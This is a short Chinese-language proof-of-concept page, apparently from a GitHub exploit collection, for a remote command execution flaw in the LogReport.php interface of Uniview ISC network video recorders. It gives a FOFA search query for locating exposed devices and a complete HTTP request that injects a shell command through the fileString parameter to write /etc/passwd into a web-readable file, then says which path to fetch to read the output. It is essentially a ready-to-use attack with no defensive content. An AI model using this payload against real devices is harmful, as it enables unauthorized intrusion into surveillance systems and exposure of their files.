## 浙江宇视isc网络视频录像机LogReport.php存在远程命令执行漏洞

## fofa
```
body="Alarm" && body="白牌定制"
```

## poc
```
GET /Interface/LogReport/LogReport.php?action=execUpdate&fileString=x;cat+/etc/passwd%3Echeck.txt HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=f952f704362e34231e810533d889f5fb; logintime=-; devLanguage=zh-CN
Upgrade-Insecure-Requests: 1
```
![4d5533d9c9f7ebfa9059b092a2b109b5](https://github.com/wy876/POC/assets/139549762/e3743a6c-346e-4615-86a6-40318176d9f0)

然后访问路径 ：

/Interface/LogReport/check.txt
